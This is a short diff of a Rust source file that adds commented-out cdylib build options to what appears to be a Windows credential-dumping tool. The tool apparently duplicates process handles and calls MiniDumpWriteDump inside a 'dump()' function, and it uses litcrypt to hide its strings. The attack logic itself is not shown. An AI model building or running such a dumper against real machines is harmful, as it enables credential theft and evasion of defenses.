@@ -1,3 +1,5 @@
+//#![crate_type = "cdylib"]
+//cargo rustc -- --crate-type cdylib 
 #[macro_use]
 extern crate litcrypt;
 use_litcrypt!();
@@ -8,6 +10,8 @@ use std::{mem::{size_of}, ptr};
 use bindings::Windows::Win32::{Foundation::HANDLE, Security::SECURITY_ATTRIBUTES, System::{Threading::GetCurrentProcess, WindowsProgramming::{CLIENT_ID, OBJECT_ATTRIBUTES, PUBLIC_OBJECT_TYPE_INFORMATION}}};
 use data::{CreateFileA, GENERIC_ALL, MiniDumpWriteDump, NtDuplicateObject, NtOpenProcess, NtQueryObject, NtQuerySystemInformation, PVOID, QueryFullProcessImageNameW, SYSTEM_HANDLE_INFORMATION, SYSTEM_HANDLE_TABLE_ENTRY_INFO};
 
+
+// #[no_mangle]
 pub fn dump() {
 
     unsafe 
